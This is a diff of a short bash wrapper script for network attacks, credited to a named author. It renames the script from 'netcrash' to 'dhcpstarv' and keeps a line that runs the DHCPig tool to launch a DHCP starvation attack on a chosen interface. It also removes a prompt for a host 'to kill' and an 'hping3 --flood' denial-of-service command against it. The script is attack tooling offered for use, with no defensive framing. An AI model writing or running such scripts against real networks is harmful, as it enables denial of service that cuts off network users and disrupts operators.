@@ -30,7 +30,7 @@ BLACK=`echo "\033[109;30m"` #SPACE bg
 END=`echo "\033[0m"`
 # ~~~~~~~~~~ Environment Setup ~~~~~~~~~~ #
 #info
-ver=$(echo netcrash_1.0)
+ver=$(echo dhcpstarv_1.0)
 #Author Love "Cosbysweater" Dufva
 
 #################################Start script and validation####################################
@@ -43,15 +43,7 @@ if [[ $EUID -ne 0 ]]; then
 	exit 1
 fi
 
-#Prerequisites
-#MOVED TO INSTALL FILE
-
-#Let's kill shit
-echo "What host do you want to kill?"
-read host
-#echo "What port? If unsure, use 80. Might work."
-#read port
-echo "What interface? (default: eth0)"
+#echo "What interface? (default: eth0)"
 read -r -p "Do you want to change interface? (Default: eth0) [y/N] " response
 case $response in
     [yY][eE][sS]|[yY]) 
@@ -62,4 +54,3 @@ case $response in
         ;;
 esac
 python DHCPig/pig.py $iface
-hping3 $host --flood
